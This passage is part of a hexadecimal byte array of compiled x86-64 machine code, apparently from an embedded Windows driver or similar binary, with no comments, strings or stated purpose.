    0x04, 0x85, 0xED, 0x41, 0x8B, 0xDC, 0x74, 0x1B, 0x8B, 0xFD, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90,
    0xB9, 0x32, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xF5, 0x3B, 0x00, 0x00, 0x83, 0xC3, 0xCE, 0x48, 0xFF,
    0xCF, 0x75, 0xED, 0x85, 0xDB, 0x74, 0x08, 0x8B, 0xCB, 0xFF, 0x15, 0xE1, 0x3B, 0x00, 0x00, 0x48,
    0xFF, 0xCE, 0x75, 0xCD, 0x4C, 0x8B, 0x64, 0x24, 0x30, 0x48, 0x8B, 0x7C, 0x24, 0x58, 0x48, 0x8B,
    0x74, 0x24, 0x50, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x83, 0xC4,
    0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x05, 0xD5, 0x4C, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x85,
    0xA6, 0x00, 0x00, 0x00, 0x33, 0xC9, 0x48, 0x89, 0x6C, 0x24, 0x38, 0x48, 0x89, 0x74, 0x24, 0x40,
    0xFF, 0x15, 0x92, 0x3B, 0x00, 0x00, 0x33, 0xC9, 0xFF, 0x15, 0x8A, 0x3B, 0x00, 0x00, 0x48, 0x89,
    0x5C, 0x24, 0x30, 0xBE, 0xE8, 0x03, 0x00, 0x00, 0x48, 0x8B, 0xE8, 0x48, 0x89, 0x7C, 0x24, 0x48,
    0xBB, 0x64, 0x00, 0x00, 0x00, 0x8D, 0x7B, 0x9E, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0xB9, 0x32, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x55, 0x3B, 0x00, 0x00, 0x83, 0xC3, 0xCE, 0x48, 0xFF,
    0xCF, 0x75, 0xED, 0x85, 0xDB, 0x74, 0x08, 0x8B, 0xCB, 0xFF, 0x15, 0x41, 0x3B, 0x00, 0x00, 0x48,
    0xFF, 0xCE, 0x75, 0xCC, 0x33, 0xC9, 0xFF, 0x15, 0x3C, 0x3B, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24,
    0x48, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x4C, 0x8B, 0xD8, 0x48, 0xB8,
    0x47, 0x08, 0x8F, 0x36, 0x8E, 0x58, 0x8B, 0x4F, 0x4C, 0x2B, 0xDD, 0x48, 0x8B, 0x6C, 0x24, 0x38,
    0x49, 0xF7, 0xE3, 0x4C, 0x2B, 0xDA, 0x49, 0xD1, 0xEB, 0x4C, 0x03, 0xDA, 0x49, 0xC1, 0xEB, 0x10,
    0x4C, 0x89, 0x1D, 0x29, 0x4C, 0x00, 0x00, 0x49, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x58, 0x48, 0x89, 0x5C, 0x24, 0x60, 0x48, 0x89, 0x6C, 0x24, 0x68, 0x4C, 0x89,
    0x6C, 0x24, 0x48, 0x4C, 0x89, 0x74, 0x24, 0x40, 0x4D, 0x8B, 0xE9, 0x45, 0x33, 0xC9, 0x4C, 0x89,
    0x7C, 0x24, 0x38, 0x8B, 0xEA, 0x44, 0x8B, 0xF9, 0x45, 0x8D, 0x51, 0x01, 0x4D, 0x8B, 0xF0, 0x41,
    0x8B, 0xD9, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x0D, 0xE2, 0x4B, 0x00, 0x00, 0x66, 0x90,
    0x8B, 0xC3, 0x4C, 0x8D, 0x04, 0x80, 0x4D, 0x03, 0xC0, 0x33, 0xC0, 0xF0, 0x46, 0x0F, 0xB1, 0x14,
    0xC1, 0x74, 0x12, 0xFF, 0xC3, 0x81, 0xFB, 0x50, 0xC3, 0x00, 0x00, 0x72, 0xE3, 0x49, 0x8B, 0xC1,
    0xE9, 0xBE, 0x01, 0x00, 0x00, 0x81, 0xFB, 0x50, 0xC3, 0x00, 0x00, 0x73, 0xF0, 0x48, 0x89, 0x74,
    0x24, 0x70, 0x48, 0x89, 0x7C, 0x24, 0x78, 0x4C, 0x89, 0x64, 0x24, 0x50, 0x45, 0x8D, 0x24, 0x2F,
    0x41, 0x8B, 0xCC, 0x41, 0x8B, 0xFC, 0xFF, 0x15, 0xE4, 0x3A, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48,
    0x8B, 0xF0, 0x0F, 0x84, 0x4D, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0xC7, 0x33, 0xD2, 0x48, 0x8B, 0xC8,
    0xE8, 0x3B, 0x20, 0x00, 0x00, 0x44, 0x8B, 0xDB, 0x48, 0x8D, 0x1D, 0x71, 0x4B, 0x00, 0x00, 0x4B,
    0x8D, 0x3C, 0x9B, 0x48, 0x8B, 0xCE, 0x48, 0x03, 0xFF, 0x48, 0x89, 0x74, 0xFB, 0x08, 0x44, 0x89,
    0x64, 0xFB, 0x2C, 0x89, 0x6C, 0xFB, 0x28, 0xFF, 0x15, 0x53, 0x3A, 0x00, 0x00, 0x85, 0xED, 0x4C,
    0x8B, 0xD8, 0x48, 0x89, 0x44, 0xFB, 0x20, 0x74, 0x2C, 0x33, 0xD2, 0x48, 0xF7, 0xF5, 0x85, 0xD2,
    0x74, 0x23, 0x48, 0x8B, 0x74, 0xFB, 0x08, 0x2B, 0xEA, 0x48, 0x8D, 0x54, 0xFB, 0x18, 0x8B, 0xCD,
    0x4A, 0x8D, 0x44, 0x1D, 0x00, 0x48, 0x03, 0xF1, 0x48, 0x8D, 0x4C, 0xFB, 0x10, 0x48, 0x89, 0x02,
    0x48, 0x89, 0x31, 0xEB, 0x15, 0x48, 0x8B, 0x44, 0xFB, 0x08, 0x48, 0x8D, 0x54, 0xFB, 0x18, 0x48,
    0x8D, 0x4C, 0xFB, 0x10, 0x4C, 0x89, 0x1A, 0x48, 0x89, 0x01, 0x4D, 0x85, 0xED, 0x74, 0x07, 0x48,
    0x8B, 0x02, 0x49, 0x89, 0x45, 0x00, 0x4D, 0x85, 0xF6, 0x0F, 0x84, 0xE2, 0x00, 0x00, 0x00, 0x48,
    0x8B, 0x09, 0x33, 0xED, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x41, 0x8B, 0xD7, 0x48, 0x89, 0x6C,
    0x24, 0x20, 0xFF, 0x15, 0x10, 0x3A, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x89, 0x44, 0xFB, 0x30,
    0x0F, 0x84, 0xBB, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0xF1, 0x39, 0x00, 0x00, 0x48,
    0x8B, 0x4C, 0xFB, 0x30, 0x41, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x41, 0x0F, 0xB6, 0xD0, 0x45, 0x33,
    0xC9, 0xC7, 0x44, 0x24, 0x28, 0x10, 0x00, 0x00, 0x00, 0x89, 0x6C, 0x24, 0x20, 0xFF, 0x15, 0xC5,
    0x39, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x4C, 0x8B, 0xD8, 0x48, 0x89, 0x44, 0xFB, 0x38, 0x75, 0x1E,
    0x48, 0x8D, 0x0D, 0x09, 0x29, 0x00, 0x00, 0xE8, 0x74, 0xF8, 0xFF, 0xFF, 0x48, 0x8B, 0x4C, 0xFB,
    0x30, 0xFF, 0x15, 0x99, 0x39, 0x00, 0x00, 0x48, 0x89, 0x6C, 0xFB, 0x30, 0xEB, 0x63, 0x48, 0x8B,
    0x44, 0xFB, 0x30, 0x4C, 0x89, 0x74, 0xFB, 0x48, 0x49, 0x81, 0xE3, 0x00, 0xF0, 0xFF, 0xFF, 0x8B,
    0x58, 0x2C, 0x48, 0x8D, 0x05, 0x57, 0x4A, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x90, 0x28, 0x00, 0x00,
    0x49, 0x03, 0xDB, 0x48, 0x8B, 0xD3, 0x48, 0x89, 0x5C, 0xF8, 0x40, 0xE8, 0x30, 0xF8, 0xFF, 0xFF,
    0x48, 0x8B, 0xC3, 0xEB, 0x2F, 0x48, 0x8D, 0x0D, 0x34, 0x28, 0x00, 0x00, 0xE8, 0x1F, 0xF8, 0xFF,
    0xFF, 0x48, 0x8D, 0x05, 0x28, 0x4A, 0x00, 0x00, 0x44, 0x8B, 0xDB, 0x4B, 0x8D, 0x0C, 0x9B, 0x48,
    0xC1, 0xE1, 0x04, 0x48, 0x03, 0xC8, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x33, 0xED, 0xF0, 0x0F, 0xB1,
    0x29, 0x48, 0x8B, 0xC6, 0x48, 0x8B, 0x7C, 0x24, 0x78, 0x48, 0x8B, 0x74, 0x24, 0x70, 0x4C, 0x8B,
    0x64, 0x24, 0x50, 0x4C, 0x8B, 0x7C, 0x24, 0x38, 0x4C, 0x8B, 0x74, 0x24, 0x40, 0x4C, 0x8B, 0x6C,
    0x24, 0x48, 0x48, 0x8B, 0x6C, 0x24, 0x68, 0x48, 0x8B, 0x5C, 0x24, 0x60, 0x48, 0x83, 0xC4, 0x58,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x38, 0x48, 0x85, 0xC9, 0x4C, 0x8B, 0xCA, 0x48, 0x8B, 0xD1, 0x74, 0x4C, 0x4D,
    0x85, 0xC9, 0x48, 0x89, 0x7C, 0x24, 0x20, 0x75, 0x47, 0x33, 0xFF, 0x4C, 0x8D, 0x05, 0xBE, 0x49,
    0x00, 0x00, 0x8B, 0xC7, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x41, 0x0F, 0x18, 0x88, 0xC0, 0x03, 0x00, 0x00, 0x49, 0x3B, 0x08, 0x74, 0x54, 0xFF, 0xC0, 0x49,
    0x83, 0xC0, 0x50, 0x3D, 0x50, 0xC3, 0x00, 0x00, 0x72, 0xE6, 0x48, 0x8D, 0x0D, 0x4F, 0x28, 0x00,
    0x00, 0xE8, 0x6A, 0xF7, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x20, 0x48, 0x83, 0xC4, 0x38, 0xC3,
    0x33, 0xFF, 0x48, 0x8D, 0x0D, 0xAF, 0x49, 0x00, 0x00, 0x8B, 0xC7, 0x66, 0x90, 0x66, 0x66, 0x90,
    0x0F, 0x18, 0x89, 0xC0, 0x03, 0x00, 0x00, 0x4C, 0x3B, 0x09, 0x75, 0x06, 0x48, 0x3B, 0x51, 0xF8,
    0x74, 0x0F, 0xFF, 0xC0, 0x48, 0x83, 0xC1, 0x50, 0x3D, 0x50, 0xC3, 0x00, 0x00, 0x72, 0xE1, 0xEB,
    0xB9, 0x3D, 0x50, 0xC3, 0x00, 0x00, 0x73, 0xB2, 0x48, 0x89, 0x5C, 0x24, 0x30, 0x48, 0x8D, 0x1C,
    0x80, 0x48, 0x89, 0x74, 0x24, 0x28, 0x48, 0x8D, 0x35, 0x23, 0x49, 0x00, 0x00, 0x48, 0x03, 0xDB,
    0x48, 0x83, 0x7C, 0xDE, 0x08, 0x00, 0x74, 0x30, 0x4D, 0x85, 0xC9, 0x74, 0x20, 0x48, 0x8B, 0x54,
    0xDE, 0x30, 0x48, 0x85, 0xD2, 0x74, 0x16, 0x48, 0x8B, 0x4C, 0xDE, 0x38, 0xFF, 0x15, 0x46, 0x38,
    0x00, 0x00, 0x48, 0x8B, 0x4C, 0xDE, 0x30, 0xFF, 0x15, 0x13, 0x38, 0x00, 0x00, 0x48, 0x8B, 0x4C,
    0xDE, 0x08, 0xFF, 0x15, 0x40, 0x38, 0x00, 0x00, 0x48, 0x89, 0x7C, 0xDE, 0x18, 0x48, 0x89, 0x7C,
    0xDE, 0x10, 0x89, 0x7C, 0xDE, 0x28, 0x89, 0x7C, 0xDE, 0x2C, 0x48, 0x89, 0x7C, 0xDE, 0x20, 0x48,
    0x89, 0x7C, 0xDE, 0x08, 0x48, 0x89, 0x7C, 0xDE, 0x30, 0x48, 0x89, 0x7C, 0xDE, 0x38, 0x48, 0x89,
    0x7C, 0xDE, 0x40, 0x48, 0x89, 0x7C, 0xDE, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F, 0xB1,
    0x3C, 0xDE, 0x48, 0x8B, 0x74, 0x24, 0x28, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x7C, 0x24,
    0x20, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x38, 0x8B, 0x44, 0x24, 0x60, 0x89, 0x44, 0x24, 0x28, 0x4C, 0x89, 0x4C, 0x24,
    0x20, 0x4D, 0x8B, 0xC8, 0x45, 0x33, 0xC0, 0xE8, 0x54, 0xFC, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x38,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x38, 0x48, 0x85, 0xC9, 0x74, 0x45, 0x48, 0x89, 0x7C, 0x24, 0x28, 0x33, 0xFF,
    0x48, 0x8D, 0x05, 0x59, 0x48, 0x00, 0x00, 0x8B, 0xD7, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x0F, 0x18, 0x88, 0xC0, 0x03, 0x00, 0x00, 0x48, 0x3B, 0x08, 0x74, 0x27, 0xFF, 0xC2, 0x48, 0x83,
    0xC0, 0x50, 0x81, 0xFA, 0x50, 0xC3, 0x00, 0x00, 0x72, 0xE6, 0x48, 0x8B, 0xD1, 0x48, 0x8D, 0x0D,
    0xEC, 0x26, 0x00, 0x00, 0xE8, 0x07, 0xF6, 0xFF, 0xFF, 0x48, 0x8B, 0x7C, 0x24, 0x28, 0x48, 0x83,
    0xC4, 0x38, 0xC3, 0x81, 0xFA, 0x50, 0xC3, 0x00, 0x00, 0x73, 0xDF, 0x48, 0x89, 0x5C, 0x24, 0x58,
    0x8B, 0xC2, 0x48, 0x89, 0x74, 0x24, 0x30, 0x48, 0x8D, 0x1C, 0x80, 0x48, 0x8D, 0x35, 0xEE, 0x47,
    0x00, 0x00, 0x48, 0x03, 0xDB, 0x48, 0x8B, 0x4C, 0xDE, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x06, 0xFF,
    0x15, 0x33, 0x37, 0x00, 0x00, 0x48, 0x89, 0x7C, 0xDE, 0x18, 0x48, 0x89, 0x7C, 0xDE, 0x10, 0x89,
    0x7C, 0xDE, 0x28, 0x89, 0x7C, 0xDE, 0x2C, 0x48, 0x89, 0x7C, 0xDE, 0x20, 0x48, 0x89, 0x7C, 0xDE,
    0x08, 0x48, 0x89, 0x7C, 0xDE, 0x30, 0x48, 0x89, 0x7C, 0xDE, 0x38, 0x48, 0x89, 0x7C, 0xDE, 0x40,
    0x48, 0x89, 0x7C, 0xDE, 0x48, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F, 0xB1, 0x3C, 0xDE, 0x48,
    0x8B, 0x74, 0x24, 0x30, 0x48, 0x8B, 0x5C, 0x24, 0x58, 0x48, 0x8B, 0x7C, 0x24, 0x28, 0x48, 0x83,
    0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x48, 0x89, 0x6C, 0x24, 0x38, 0x48, 0x89, 0x7C, 0x24,
    0x48, 0x4C, 0x89, 0x64, 0x24, 0x20, 0x4D, 0x8B, 0xE1, 0x49, 0x8B, 0xE8, 0x4C, 0x8B, 0xCA, 0x48,
    0x8B, 0xF9, 0x0F, 0x84, 0xAE, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0xA5, 0x00, 0x00,
    0x00, 0x41, 0x8B, 0x00, 0x48, 0x89, 0x5C, 0x24, 0x30, 0xBB, 0x04, 0x80, 0x6A, 0xC8, 0x85, 0xC0,
    0x0F, 0x84, 0x8C, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x45, 0x33, 0xC0, 0x49, 0x8B, 0xC9, 0x48,
    0x89, 0x74, 0x24, 0x40, 0xFF, 0x15, 0x16, 0x37, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xDF, 0x26, 0x00,
    0x00, 0x48, 0x8B, 0xD0, 0x48, 0x8B, 0xF0, 0xE8, 0x04, 0xF5, 0xFF, 0xFF, 0x48, 0x85, 0xF6, 0x74,
    0x41, 0x4D, 0x85, 0xE4, 0x75, 0x14, 0x48, 0x8D, 0x0D, 0x83, 0x26, 0x00, 0x00, 0x48, 0x8B, 0xD6,
    0x48, 0x89, 0x37, 0xE8, 0xE8, 0xF4, 0xFF, 0xFF, 0xEB, 0x20, 0x8B, 0x55, 0x00, 0x4D, 0x8B, 0xC4,
    0x48, 0x8B, 0xCE, 0xE8, 0xD8, 0xF5, 0xFF, 0xFF, 0x48, 0x8D, 0x0D, 0x21, 0x26, 0x00, 0x00, 0x48,
    0x8B, 0xD0, 0x48, 0x89, 0x07, 0xE8, 0xC6, 0xF4, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x39, 0x07, 0x0F,
    0x45, 0xD8, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x4C, 0x8B,
    0x64, 0x24, 0x20, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x8B, 0x6C, 0x24, 0x38, 0x48, 0x83, 0xC4,
    0x28, 0xC3, 0x8B, 0xC3, 0xEB, 0xE3, 0x4C, 0x8B, 0x64, 0x24, 0x20, 0x48, 0x8B, 0x7C, 0x24, 0x48,
    0x48, 0x8B, 0x6C, 0x24, 0x38, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x48, 0x89, 0x7C, 0x24, 0x48, 0x4C, 0x8B, 0xCA, 0x48,
    0x8B, 0xF9, 0x0F, 0x84, 0x82, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x74, 0x7D, 0x41, 0x8B, 0x00,
    0x48, 0x89, 0x5C, 0x24, 0x38, 0xBB, 0x04, 0x80, 0x6A, 0xC8, 0x85, 0xC0, 0x74, 0x5B, 0x48, 0x8B,
    0xD0, 0x45, 0x33, 0xC0, 0x49, 0x8B, 0xC9, 0x48, 0x89, 0x74, 0x24, 0x40, 0xFF, 0x15, 0x2E, 0x36,
    0x00, 0x00, 0x48, 0x8D, 0x0D, 0xF7, 0x25, 0x00, 0x00, 0x48, 0x8B, 0xD0, 0x48, 0x8B, 0xF0, 0xE8,
    0x1C, 0xF4, 0xFF, 0xFF, 0x48, 0x85, 0xF6, 0x74, 0x1A, 0x48, 0x8D, 0x0D, 0xA0, 0x25, 0x00, 0x00,
    0x48, 0x8B, 0xD6, 0x48, 0x89, 0x37, 0xE8, 0x05, 0xF4, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x39, 0x07,
    0x0F, 0x45, 0xD8, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x38, 0x48,
    0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x38,
    0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48,
    0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x78, 0x48, 0x89, 0x58, 0x18, 0x48, 0x8B, 0xDA, 0x33, 0xD2,
    0x48, 0x89, 0x78, 0x20, 0x48, 0x8B, 0xF9, 0x44, 0x8D, 0x42, 0x40, 0x48, 0x8B, 0xCB, 0xE8, 0x6D,
    0x1A, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x66, 0xC7, 0x03,
    0x40, 0x00, 0x66, 0xC7, 0x43, 0x02, 0x01, 0x00, 0xC7, 0x43, 0x08, 0xFF, 0xFF, 0xFF, 0xFF, 0xC7,
    0x43, 0x0C, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x15, 0x0C, 0x35, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x4C,
    0x8D, 0x5C, 0x24, 0x40, 0x48, 0x8D, 0x44, 0x24, 0x50, 0x4C, 0x89, 0x5C, 0x24, 0x30, 0x48, 0x89,
    0x44, 0x24, 0x28, 0x41, 0x8D, 0x49, 0x1B, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0xD7, 0x48, 0xC7, 0x44,
    0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xD4, 0x34, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74,
    0x4F, 0x48, 0x8B, 0x88, 0xB8, 0x00, 0x00, 0x00, 0xC7, 0x40, 0x30, 0xBB, 0x00, 0x00, 0xC0, 0x48,
    0x8B, 0xD0, 0xC6, 0x41, 0xB8, 0x1B, 0xC6, 0x41, 0xB9, 0x09, 0x48, 0x89, 0x59, 0xC0, 0x48, 0x8B,
    0xCF, 0xFF, 0x15, 0xA1, 0x34, 0x00, 0x00, 0x3D, 0x03, 0x01, 0x00, 0x00, 0x75, 0x1C, 0x48, 0x8D,
    0x4C, 0x24, 0x50, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0xC7, 0x44, 0x24, 0x20,
    0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x76, 0x34, 0x00, 0x00, 0x8B, 0x44, 0x24, 0x40, 0xEB, 0x05,
    0xB8, 0x9A, 0x00, 0x00, 0xC0, 0x48, 0x8B, 0xBC, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x9C,
    0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x78, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0xC4, 0x48, 0x81, 0xEC, 0x98, 0x00, 0x00, 0x00, 0x48, 0x89, 0x58, 0xF8, 0x48, 0x89,
    0x68, 0xF0, 0x48, 0x89, 0x70, 0xE8, 0x48, 0x8B, 0xD9, 0x41, 0x0F, 0xB6, 0xF0, 0x48, 0x8B, 0xEA,
    0x48, 0x89, 0x78, 0xE0, 0x48, 0x8D, 0x48, 0xC0, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x41, 0x8B, 0xF9,
    0xFF, 0x15, 0x32, 0x34, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x4C, 0x8D, 0x5C, 0x24, 0x48, 0x4C, 0x89,
    0x5C, 0x24, 0x30, 0x48, 0x8D, 0x44, 0x24, 0x58, 0x41, 0x8D, 0x49, 0x1B, 0x48, 0x89, 0x44, 0x24,
    0x28, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0xD3, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0x15, 0xFA, 0x33, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x68, 0x48, 0x8B, 0x90, 0xB8, 0x00,
    0x00, 0x00, 0x48, 0x83, 0xEA, 0x48, 0x74, 0x5B, 0x8B, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0xC7,
    0x40, 0x30, 0xBB, 0x00, 0x00, 0xC0, 0xC6, 0x02, 0x1B, 0x89, 0x4A, 0x20, 0x40, 0x88, 0x72, 0x01,
    0x48, 0x89, 0x6A, 0x10, 0xC7, 0x42, 0x08, 0x00, 0x00, 0x00, 0x00, 0x89, 0x7A, 0x18, 0x48, 0x8B,
    0xCB, 0x48, 0x8B, 0xD0, 0xFF, 0x15, 0xAE, 0x33, 0x00, 0x00, 0x3D, 0x03, 0x01, 0x00, 0x00, 0x75,
    0x26, 0x48, 0x8D, 0x4C, 0x24, 0x58, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x48, 0xC7,
    0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x83, 0x33, 0x00, 0x00, 0x8B, 0x44, 0x24,
    0x48, 0xEB, 0x04, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x7C, 0x24, 0x78, 0x48, 0x8B, 0xB4, 0x24,
    0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xAC, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x9C, 0x24,
    0x90, 0x00, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x98, 0x00, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x4C, 0x8B, 0xDC, 0x48, 0x81, 0xEC, 0x18, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x87, 0x43, 0x00,
    0x00, 0x48, 0x89, 0x84, 0x24, 0xE0, 0x01, 0x00, 0x00, 0x49, 0x89, 0x5B, 0x10, 0x49, 0x89, 0x6B,
    0x18, 0x49, 0x89, 0x7B, 0xF8, 0x48, 0x8B, 0x79, 0x38, 0x4D, 0x89, 0x63, 0xF0, 0x48, 0x8B, 0xD9,
    0x4D, 0x89, 0x73, 0xE0, 0x45, 0x33, 0xF6, 0x49, 0x8D, 0x8B, 0x88, 0xFE, 0xFF, 0xFF, 0x45, 0x33,
    0xC0, 0x33, 0xD2, 0x40, 0x32, 0xED, 0x45, 0x8B, 0xE6, 0x45, 0x89, 0xB3, 0xD8, 0xFE, 0xFF, 0xFF,
    0xFF, 0x15, 0x02, 0x33, 0x00, 0x00, 0x4C, 0x8D, 0x9C, 0x24, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x8D,
    0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x41, 0x8D, 0x4E, 0x1B, 0x4C, 0x89, 0x5C, 0x24, 0x30, 0x48,
    0x89, 0x44, 0x24, 0x28, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0xD7, 0x4C, 0x89, 0x74,
    0x24, 0x20, 0xFF, 0x15, 0xC8, 0x32, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x64, 0x48, 0x8B, 0x90,
    0xB8, 0x00, 0x00, 0x00, 0x48, 0x83, 0xEA, 0x48, 0x74, 0x57, 0xC7, 0x40, 0x30, 0xBB, 0x00, 0x00,
    0xC0, 0x48, 0x8D, 0x8C, 0x24, 0xE0, 0x00, 0x00, 0x00, 0xC6, 0x02, 0x1B, 0x48, 0x89, 0x4A, 0x10,
    0xC6, 0x42, 0x01, 0x0F, 0xC7, 0x42, 0x20, 0x40, 0x00, 0x00, 0x00, 0x44, 0x89, 0x72, 0x08, 0x44,
    0x89, 0x72, 0x18, 0x48, 0x8B, 0xCF, 0x48, 0x8B, 0xD0, 0xFF, 0x15, 0x79, 0x32, 0x00, 0x00, 0x3D,
    0x03, 0x01, 0x00, 0x00, 0x75, 0x1B, 0x48, 0x8D, 0x8C, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x45, 0x33,
    0xC9, 0x45, 0x33, 0xC0, 0x33, 0xD2, 0x4C, 0x89, 0x74, 0x24, 0x20, 0xFF, 0x15, 0x4F, 0x32, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0xE8, 0x22, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0xB8, 0x00, 0x00, 0x00,
    0x4C, 0x89, 0xAC, 0x24, 0x00, 0x02, 0x00, 0x00, 0xFF, 0x15, 0x22, 0x32, 0x00, 0x00, 0x48, 0x8D,
    0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x60, 0x48, 0x8D, 0x4C, 0x24, 0x48,
